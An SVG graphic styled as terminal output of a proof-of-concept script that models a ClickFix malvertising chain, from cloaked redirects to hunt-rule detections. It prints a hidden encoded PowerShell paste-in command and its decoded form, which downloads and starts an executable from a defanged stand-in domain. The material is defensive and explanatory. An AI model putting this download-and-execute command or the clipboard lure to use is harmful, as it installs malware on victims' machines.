<svg xmlns="http://www.w3.org/2000/svg" width="1053" height="385" viewBox="0 0 1053 385" role="img" aria-label="Malvertising chain model: cloaked redirect, decoded ClickFix command and three hunt rule hits"><title>Malvertising chain model: cloaked redirect, decoded ClickFix command and three hunt rule hits</title><rect width="1053" height="385" rx="6" fill="#050d05" stroke="#00ff41" stroke-opacity="0.25"/><circle cx="18" cy="15" r="4" fill="#ff5f57"/><circle cx="32" cy="15" r="4" fill="#febc2e"/><circle cx="46" cy="15" r="4" fill="#28c840"/><g font-family="JetBrains Mono, Fira Code, Courier New, monospace" font-size="13"><text x="18" y="57" fill="#00ff41" xml:space="preserve">$ python3 poc.py</text><text x="18" y="76" fill="#c8d8c8" xml:space="preserve">=== attacker chain ===</text><text x="18" y="95" fill="#c8d8c8" xml:space="preserve">victim click  -&gt; redirect hop 1 -&gt; hop 2 (NRD) -&gt; landing clone</text><text x="18" y="114" fill="#c8d8c8" xml:space="preserve">analyst click -&gt; clean lookalike page (no payload)</text><text x="18" y="133" fill="#c8d8c8" xml:space="preserve"></text><text x="18" y="152" fill="#c8d8c8" xml:space="preserve">ClickFix clipboard command (what the victim pastes into Win+R):</text><text x="18" y="171" fill="#c8d8c8" xml:space="preserve">  powershell -w hidden -enc aQB3AHIAIAAtAHUAcwBlAGIAIABoAHQAdABwADoALwAvAGMAZABuAC0AdQBwAGQAYQB0AGUALQ...</text><text x="18" y="190" fill="#c8d8c8" xml:space="preserve"></text><text x="18" y="209" fill="#c8d8c8" xml:space="preserve">=== defender: decode ===</text><text x="18" y="228" fill="#c8d8c8" xml:space="preserve">decoded: iwr -useb http://cdn-update-soft[.]top/config.php -outfile $env:TEMP\s.exe; start $env:TEMP\s.exe</text><text x="18" y="247" fill="#c8d8c8" xml:space="preserve"></text><text x="18" y="266" fill="#c8d8c8" xml:space="preserve">=== defender: hunt ===</text><text x="18" y="285" fill="#c8d8c8" xml:space="preserve">  WS-1042: T1 LOLBin -enc from Run dialog (ClickFix)</text><text x="18" y="304" fill="#c8d8c8" xml:space="preserve">  WS-1042: T2 executable staged in %TEMP% by script</text><text x="18" y="323" fill="#c8d8c8" xml:space="preserve">  WS-1042: T3 beacon to suspicious NRD-style domain</text><text x="18" y="342" fill="#c8d8c8" xml:space="preserve"></text><text x="18" y="361" fill="#c8d8c8" xml:space="preserve">chain modeled end to end: ad -&gt; cloak -&gt; clone page -&gt; ClickFix LOLBin -&gt; staged exe -&gt; NRD beacon; hunt rules isolate the victim.</text></g></svg>
